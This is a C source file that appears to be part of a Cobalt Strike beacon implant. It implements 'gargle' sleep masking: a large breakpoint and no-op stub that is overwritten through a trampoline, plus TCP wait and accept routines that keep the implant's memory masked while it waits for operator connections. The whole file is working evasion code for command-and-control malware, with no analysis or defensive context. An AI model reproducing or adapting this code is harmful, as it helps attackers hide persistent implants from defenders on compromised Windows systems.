/* gargle! */
#include <WinSock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "sleepmask_gen3.h"

#define GARGLE_TCP_ACTION_RECV   0
#define GARGLE_TCP_ACTION_ACCEPT 1

typedef struct {
	int    action;
	SOCKET in;
	SOCKET out;
	SOCKET (__stdcall *accept)(SOCKET, struct sockaddr *, int *);
	void   (__stdcall *recv)(SOCKET, void *, int, int);
} GARGLE_TCP_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_TCP_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_TCP_ARGS * args) {
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();

}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleWaitTCP(SOCKET s) {
	/* Phase 2 wait-window: idle-wait for socket data masked, in gen3
	 * sleep slices (select() between windows is a microsecond syscall).
	 * Guard semantics unchanged: threaded parents and nook==0 profiles
	 * keep the plain behavior. */
	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
		struct timeval tv;
		fd_set rd;

		tv.tv_sec = 0;
		tv.tv_usec = 0;
		FD_ZERO(&rd);
		FD_SET(s, &rd);
		while (select(0, &rd, NULL, NULL, &tv) == 0) {
			if (!gen3_sleep(700))
				Sleep(700);
			FD_ZERO(&rd);
			FD_SET(s, &rd);
		}
	}
}

SOCKET GargleAccept(SOCKET s) {
	/* Phase 2 wait-window: idle-accept masked in gen3 slices, then a
	 * plain (immediate) accept once the listener is readable. */
	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
		struct timeval tv;
		fd_set rd;

		tv.tv_sec = 0;
		tv.tv_usec = 0;
		FD_ZERO(&rd);
		FD_SET(s, &rd);
		while (select(0, &rd, NULL, NULL, &tv) == 0) {
			if (!gen3_sleep(700))
				Sleep(700);
			FD_ZERO(&rd);
			FD_SET(s, &rd);
		}
	}
	return accept(s, NULL, 0);
}